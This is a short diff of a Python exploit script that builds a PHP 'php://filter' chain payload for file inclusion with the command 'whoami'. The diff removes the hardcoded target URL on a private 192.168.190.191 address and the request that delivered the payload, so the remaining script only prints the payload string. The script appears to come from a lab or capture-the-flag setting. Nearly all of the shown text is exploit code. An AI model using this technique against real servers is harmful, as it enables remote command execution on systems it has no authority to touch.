@@ -2,7 +2,6 @@
 import requests
 
 #参数file
-url = "http://192.168.190.191/index.php"
 file_to_use = "index"
 command = "whoami"
 
@@ -50,10 +49,3 @@ filters += "convert.base64-decode"
 
 final_payload = f"php://filter/{filters}/resource={file_to_use}"
 print(final_payload)
-r = requests.get(url, params={
-    "0": command,
-    #"action": "include",
-    "file": final_payload
-})
-
-print(r.text)
